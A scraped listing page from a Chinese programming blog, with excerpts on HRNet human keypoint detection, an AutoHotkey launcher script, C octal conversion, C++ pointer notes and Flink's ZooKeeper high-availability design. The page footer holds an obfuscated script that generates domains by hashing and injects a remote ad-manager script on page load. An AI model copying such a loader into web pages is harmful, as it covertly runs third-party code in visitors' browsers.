人体关键点检测1：人体姿势估计数据集(含下载链接) https://blog.csdn.net/guyuealian/article/details/134703548人体关键点检测2：Pytorch实现人体关键点检测(人体姿势估计)含训练代码和数据集 https://blog.csdn.net/guyuealian/article/details/134837816人体关键点检测3：Android实现人体关键点检测(人体姿势估计)含源码 可实时检测 https://blog.csdn.net/guyuealian/article/details/134881797人体关键点检测4：C/C++实现人体关键点检测(人体姿势估计)含源码 可实时检测 https://blog.csdn.net/guyuealian/article/details/134881797手部关键点检测1：手部关键点(手部姿势估计)数据集(含下载链接)https://blog.csdn.net/guyuealian/article/details/133277630手部关键点检测2：YOLOv5实现手部检测(含训练代码和数据集)https://blog.csdn.net/guyuealian/article/details/133279222手部关键点检测3：Pytorch实现手部关键点检测(手部姿势估计)含训练代码和数据集https://blog.csdn.net/guyuealian/article/details/133277726手部关键点检测4：Android实现手部关键点检测(手部姿势估计)含源码 可实时检测https://blog.csdn.net/guyuealian/article/details/133931698手部关键点检测5：C++实现手部关键点检测(手部姿势估计)含源码 可实时检测https://blog.csdn.net/guyuealian/article/details/133277748 2.人体关键点检测方法 目前主流的人体关键点检测(人体姿势估计)方法主要两种：一种是Top-Down（自上而下）方法，另外一种是Bottom-Up（自下而上）方法；
(1)Top-Down(自上而下)方法 将人体检测和人体关键点检测(人体姿势估计)检测分离，在图像上首先进行人体目标检测，定位人体位置；然后crop每一个人体图像，再估计人体关键点；这类方法往往比较慢，但姿态估计准确度较高。目前主流模型主要有CPN，Hourglass，CPM，Alpha Pose，HRNet等。
(2)Bottom-Up(自下而上)方法： 先估计图像中所有人体关键点，然后在通过Grouping的方法组合成一个一个实例；因此这类方法在测试推断的时候往往更快速，准确度稍低。典型就是COCO2016年人体关键点检测冠军Open Pose。
通常来说，Top-Down具有更高的精度，而Bottom-Up具有更快的速度；就目前调研而言， Top-Down的方法研究较多，精度也比Bottom-Up（自下而上）方法高。本项目采用Top-Down(自上而下)方法，先使用YOLOv5模型实现人体检测，然后再使用HRNet进行人体关键点检测(人体姿势估计)；
本项目基于开源的HRNet进行改进，关于HRNet项目请参考GitHub
HRNet: https://github.com/leoxiaobin/deep-high-resolution-net.pytorch
3.人体关键点检测模型训练 本项目采用Top-Down(自上而下)方法，使用YOLOv5模型实现人体检测，并基于开源的HRNet实现人体关键点检测(人体姿态估计)；为了方便后续模型工程化和Android平台部署，项目支持轻量化模型LiteHRNet和Mobilenet模型训练和测试，并提供Python/C++/Android多个版本；轻量化Mobilenet-v2模型在普通Android手机上可以达到实时的检测效果，CPU(4线程)约50ms左右，GPU约30ms左右 ，基本满足业务的性能需求
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9cb5c0360febb650d04a4e6b60c6e53d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbf7dbf57a0008675aa8bee298d71c50/" rel="bookmark">
			第三方电脑小爱同学用快捷键唤醒
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第三方电脑安装小爱同学-CSDN博客
请结合之前安装小爱同学的教程安装过程请提前取消windows更新
安装完成之后登录账号即可使用
Ahk2.0 下载地址：https://www.autohotkey.com/download/ahk-v2.zip
打开链接即可自动下载，下载后解压出来点击install.cmd安装即可
将小爱固定到开始菜单，然后直接将开始菜单图标拖到桌面（如果不喜欢桌面有东西那么复制到以下路径C:\ProgramData\Microsoft\Windows\Start Menu\Programs）
然后在以下路径新建文本文档（如果无法新建的话在桌面新建一个txt文档，修改完成后复制到以下路径即可）
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
命名为xiaoai.ahk
; ----- 在桌面 CTRL+SHIFT+A 打开小爱同学语音 ----- ~^+a:: { if (!WinExist("小爱同学")) { ; 未启动，启动小爱并等待页面初始化完成 Run "小爱同学.lnk", "C:\ProgramData\Microsoft\Windows\Start Menu\Programs" aid := WinWait("小爱同学", "小爱同学", 5) } WinActivate ; 将小爱窗口激活 Sleep 200 ; 不加这个延时不太稳定 WinGetPos , , &amp;W, &amp;H, "" MouseGetPos &amp;xpos, &amp;ypos Click "37 " . (H - 37) Click xpos . " " . ypos . " 0" } 修改xiaoai.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bbf7dbf57a0008675aa8bee298d71c50/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68c88a74f871c19f43c4447a65f45aa5/" rel="bookmark">
			用C语言十进制转八进制的转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 #include&lt;stdio.h&gt; #include&lt;math.h&gt; int main() { int n = 123; //十进制转八进制 int r = 0; int s = 0; int t = -1; do { r = n % 8; n = n / 8; t = t + 1; s = s + r * pow(10,t); } while (n != 0); printf("%d", s); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6728a0f4d6eef67a71dd7c20db14134f/" rel="bookmark">
			C&#43;&#43;基础与细节理解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前言 本博客旨在记录C++学习过程中的一些细节知识理解，由于问题的产生并非成体系，所以前期的记录可能会无序一些。烦请读者参阅目录进行快速的问题定位与跳转
C++基础与细节理解 前言正文部分C++基础：为什么new的时候要使用指针接收？C++基础：如何优雅地用指针指向数组 正文部分 C++基础：为什么new的时候要使用指针接收？ 我们经常注意到，在C++编程中，以下两种创建对象的形式是最为常见的：
QPushButton *button1 = new QPushButton("示例1"); QPushButton button2("示例2"); 我们知道，方式一将对象创建在堆中，并通过button1指向对象；方式二则是将对象创建在栈上，button2直接表示对象
为什么要这么做？这都是出于更健全的内存维护考虑：
方式一不允许使用非指针指向堆对象，是为了应用智能指针，在对象没有引用的时候，自主的回收对象分配的内存（否则需要显式的delete对象）方式二由程序在对象作用域内自维护，内存仍是安全的 综上，在编程的时候，我们只推荐使用以上两种对象创建方式，并认为第二种要比第一种更优先（在对象占用内存较小时）
C++基础：如何优雅地用指针指向数组 在进行C++编程的时候，到底是选择一维指针还是二维指针指向某一个数组常常困扰着我们。其实有一个非常优雅的判断方式，那就是确保指针维度与数组维度是一致的
我们首先需要明确一个概念，左值=右值，在左值使用*或者[]用以提升维度，在右值使用*或者[]用以降低维度。通过调整确保左右维度一致的赋值就是语法合规的。
我们以三维数组为例，展示分别以一维指针和二维指针接收数组的形式：
int exampleArr[2][2][2] = {1,2,3,4,5,6}; //用一维数组来接收exampleArr[0]所指向的二维数组的第一个值，即exampleArr[0][0]; int *point1 = *exampleArr[0]; //等价于int *point1 = exampleArr[0][0] //用二维数组来接收exampleArr[0]所指向的二维数组，即exampleArr[0]; int (*point2)[2] = exampleArr[0]; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e061f0685cc54395413d4f04cf1b5c3/" rel="bookmark">
			flink源码分析之功能组件(五)-高可用组件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 本系列是flink源码分析的第二个系列，上一个《flink源码分析之集群与资源》分析集群与资源，本系列分析功能组件，kubeclient，rpc，心跳，高可用，slotpool，rest，metrics，future。
本文解释高可用组件，包括两项服务，主节点选举和主节点变更通知*
高可用服务常见有两种实现，zookeeper和k8s，本文介绍zookeeper
*flink高可用组件还有作业状态，作业存储，作业结果存储服务，这些放到作业执行系列分析，本章暂不涉及
设计 上图是高可用包结构，也体现逻辑结构，功能结构
highavailability 定义高可用的接口和抽象类；Services类，即构建工厂，包括zookeeper实现
leaderelection 选主组件
leaderretrieval 主节点变更获取组件
zookeeper zookeeper实现*，高可用zk实现依赖curator
*这是我理想的包结构，选主组件，主节点变更组件zookeeper实现都在zookeeper目录
znode结构 zookeeper分布式设计，不能绕开的是znode设计，本节解释一下高可用组件znode设计
上图是选主和主节点变更通知znode，flink还有作业存储，检查点，与leader节点同级，未在上图展示
/latch 选主节点，master多个组件都需要选主，只有一个选主节点，选主那节解释选主怎样做的
/connection_info 存储master组件主节点的地址
其他节点的含义比较明确，不一一解释
高可用构建服务 highavailability包是高可用组件的初始化和构建工厂，包括构建面向各业务组件的高可用服务
flink代码规范，***Services是构建服务
ClientHighAvailabilityServices 构建rest端主节点获取服务，rest端是flink内置rest服务，本系列有一章专门解释，该服务给RestClusterClient获取rest端主节点地址，构建rpc网关，远程执行集群管理
HighAvailabilityServices 构建master组件，包括分发器，作业管理器，资源管理器，rest端等的选主服务和主节点获取服务，HighAvailabilityServices继承ClientHighAvailabilityServices，意味着master内部也可获取rest端地址，使用rest服务
ZooKeeperMultipleComponentLeaderElectionHaServices zookeeper的多组件选主高可用构建服务实现，关于多组件选主下一节详细解释
选主 上图选主类图，下面分3各部分解释，业务组件；服务与驱动；监听机制
业务组件层 ResourceManagerServiceImpl/DefaultDispatcherRunner/JobMasterServiceLeadershipRunner
3个分别是资源管理器，分发器和作业管理器的运行管理服务，选主管理是其中一个职责，都实现了LeaderContender，接收当选/退选事件，继而对管理的master组件相应的处理
服务和驱动 Flink高可用组件是服务和驱动分离设计，解耦了服务逻辑与底层的分布式协调驱动，这样分布式引擎可以无缝切换
flink选主有两套的选主组件，单组件和多组件
单组件选主 LeaderElectionService/LeaderElectionDriver
单组件的选主服务，对应的zookeeper驱动实现被标注为”废弃”，flink master有多个组件，每类组件选主需要多个/latch，选主比较耗时，多个选主效率较低；作业节点不定，造成/latch需要增删，节点管理困难，flink使用的是多组件的选主
多组件选主 MultipleComponentLeaderElectionService/MultipleComponentLeaderElectionDriver
b.1) LeaderElectionService代表单个组件，自身是LeaderElectionEventHandler实现，注册到
MultipleComponentLeaderElectionService
b.2) MultipleComponentLeaderElectionService构建MultipleComponentLeaderElectionDriver ，自身是MultipleComponentLeaderElectionDriver.Listener实现，获取MultipleComponentLeaderElectionDriver的通知
b.3) MultipleComponentLeaderElectionDriver zookeeper实现依赖curator的LeaderLatch，自身实现LeaderLatchListener，获取zookeeper的leader选举通知
c) 桥接
桥接涉及两个类，MultipleComponentLeaderElectionDriverAdapter和LeaderElectionEventHandler
MultipleComponentLeaderElectionDriverAdapter 该类虽然命名为adapter，但我理解不是适配器，实则是桥接，装扮成LeaderElectionDriver实现，高可用的功能转给MultipleComponentLeaderElectionService，后者通过LeaderElectionEventHandler通知LeaderElectionService
​​​​​​​监听机制 上一节服务与驱动介绍了监听机制，本节详细介绍各个监听器
LeaderLatchListener curator LeaderLatch的监听器，接收当选/未当选消息，通知flink高可用多组件选主的监听器
MultipleComponentLeaderElectionDriver.Listener flink高可用组件监听器，生成会话Id，通知注册的多组件；会话是新主节点的生命周期，类似新王登记的年号，用于识别旧主或更新主，分布式环境是关键，避免不一致的发生
LeaderElectionEventHandler 连接多组件选主和单组件选主的监听器，接收当前的sessionId，此接口同时接收连接信息变更，因此也是获取主节点变更的监听器
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1e061f0685cc54395413d4f04cf1b5c3/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/41/">«</a>
	<span class="pagination__item pagination__item--current">42/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/43/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>